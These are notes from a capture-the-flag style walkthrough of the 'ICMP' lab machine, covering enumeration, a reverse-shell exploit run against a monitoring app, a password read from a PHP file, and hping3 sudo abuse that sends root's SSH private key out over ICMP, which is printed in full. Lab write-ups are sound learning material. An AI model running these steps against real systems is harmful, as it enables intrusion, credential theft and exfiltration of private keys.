----------------------------------------------------
# Author -> Shubham Rannpise
----------------------------------------------------
# ICMP
# 26/2/2023

----------------------------------------------------
# gobuster
----------------------------------------------------
└─$ gobuster dir -u http://192.168.56.81  -t 50  -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x .html,.php,.txt -b 400,403,404,500 --wildcard
/index.php (Status: 302)
/mon (Status: 301)

----------------------------------------------------
# nmap result
----------------------------------------------------
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))

----------------------------------------------------
# exploit
----------------------------------------------------
searchsploit -m 48980

└─$ python3 48980.py http://192.168.56.81/mon 192.168.118.4 1234
fc017340ee17bb3408f68abcd5549e47

----------------------------------------------------
# priv esc
----------------------------------------------------
www-data@icmp:/home/fox$ ls -la devel/crypt.php
ls -la devel/crypt.php
-rw-r--r-- 1 fox fox 56 Dec  3  2020 devel/crypt.php
www-data@icmp:/home/fox$ cat devel/crypt.php
cat devel/crypt.php
<?php
echo crypt('BUHNIJMONIBUVCYTTYVGBUHJNI','da');
?>
www-data@icmp:/home/fox$ 



Now we can attempt to authenticate via SSH as fox with the password BUHNIJMONIBUVCYTTYVGBUHJNI.

$ sudo -l
[sudo] password for fox: 
Matching Defaults entries for fox on icmp:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User fox may run the following commands on icmp:
    (root) /usr/sbin/hping3 --icmp *
    (root) /usr/bin/killall hping3


sudo hping3 --icmp 127.0.0.1 -d 100 --sign signature --file /root/.ssh/id_rsa  

sudo hping3 --icmp 127.0.0.1 --listen signature --safe  



-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----